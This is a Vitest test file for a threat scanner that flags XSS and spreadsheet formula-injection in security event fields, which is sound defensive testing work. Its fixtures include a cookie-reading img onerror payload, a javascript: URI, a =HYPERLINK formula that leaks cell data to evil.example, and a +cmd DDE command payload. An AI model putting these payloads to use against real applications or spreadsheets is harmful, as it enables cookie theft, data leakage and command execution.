import { describe, it, expect } from "vitest";
import { scanForThreats } from "../threat";

describe("scanForThreats", () => {
  it("flags xss for <img ... onerror> payload (evt-052 style)", () => {
    const event = {
      id: "evt-052",
      description:
        'Reported subject line: <img src=x onerror=alert(document.cookie)> — submitted via the abuse mailbox for triage.',
    };
    const flags = scanForThreats(event);
    expect(flags).toContain("xss");
  });

  it("flags xss for <script> tag", () => {
    const event = { description: "<script>alert(1)</script>" };
    expect(scanForThreats(event)).toContain("xss");
  });

  it("flags xss for inline event handler", () => {
    const event = { title: 'link onclick=evil()' };
    expect(scanForThreats(event)).toContain("xss");
  });

  it("flags xss for javascript: URI", () => {
    const event = { assetIp: "javascript:alert(1)" };
    expect(scanForThreats(event)).toContain("xss");
  });

  it("flags formula-injection for =HYPERLINK(...) in description (evt-053 style)", () => {
    const event = {
      id: "evt-053",
      description:
        '=HYPERLINK("http://evil.example/?leak="&A1,"invoice") detected as the original filename of an uploaded attachment.',
    };
    const flags = scanForThreats(event);
    expect(flags).toContain("formula-injection");
  });

  it("flags formula-injection for +cmd string (evt-054 style)", () => {
    const event = {
      description: "+cmd|'/C calc'!A0 reported as the NetBIOS name of a newly enrolled device pending review.",
    };
    const flags = scanForThreats(event);
    expect(flags).toContain("formula-injection");
  });

  it("flags formula-injection when assetHostname starts with +", () => {
    const event = { assetHostname: "+cmd|'/C calc'!A0" };
    expect(scanForThreats(event)).toContain("formula-injection");
  });

  it("flags formula-injection when a field starts with -", () => {
    const event = { title: "-dangerous formula" };
    expect(scanForThreats(event)).toContain("formula-injection");
  });

  it("flags formula-injection when a field starts with @", () => {
    const event = { title: "@SUM(1+1)" };
    expect(scanForThreats(event)).toContain("formula-injection");
  });

  it("returns empty array for clean event data", () => {
    const event = {
      id: "evt-001",
      title: "Suspicious process execution detected on prod-web-03",
      description: "Process mimikatz.exe was executed by user svc-backup.",
      assetHostname: "prod-web-03.penguwave.internal",
      assetIp: "10.0.3.15",
      sourceIp: "10.0.5.22",
      userId: "usr-002",
    };
    expect(scanForThreats(event)).toEqual([]);
  });

  it("does not throw when fields are null", () => {
    const event = { sourceIp: null, userId: null };
    expect(() => scanForThreats(event)).not.toThrow();
    expect(scanForThreats(event)).toEqual([]);
  });

  it("does not throw when fields are undefined", () => {
    const event = { sourceIp: undefined };
    expect(() => scanForThreats(event)).not.toThrow();
  });

  it("does not throw when fields are numbers", () => {
    const event = { userId: 12345 };
    expect(() => scanForThreats(event)).not.toThrow();
  });

  it("returns de-duplicated flags (not repeated)", () => {
    // Both title and description contain xss
    const event = {
      title: "<script>x</script>",
      description: "<script>y</script>",
    };
    const flags = scanForThreats(event);
    expect(flags.filter((f) => f === "xss").length).toBe(1);
  });

  it("can return both xss and formula-injection flags", () => {
    const event = {
      title: "<script>alert(1)</script>",
      description: "=BAD()",
    };
    const flags = scanForThreats(event);
    expect(flags).toContain("xss");
    expect(flags).toContain("formula-injection");
  });

  it("ignores fields not in the scanned set (e.g. id)", () => {
    // 'id' is not in TEXT_FIELDS, so XSS payloads there must not be flagged
    const event = { id: "<script>evil</script>" };
    expect(scanForThreats(event)).toEqual([]);
  });
});
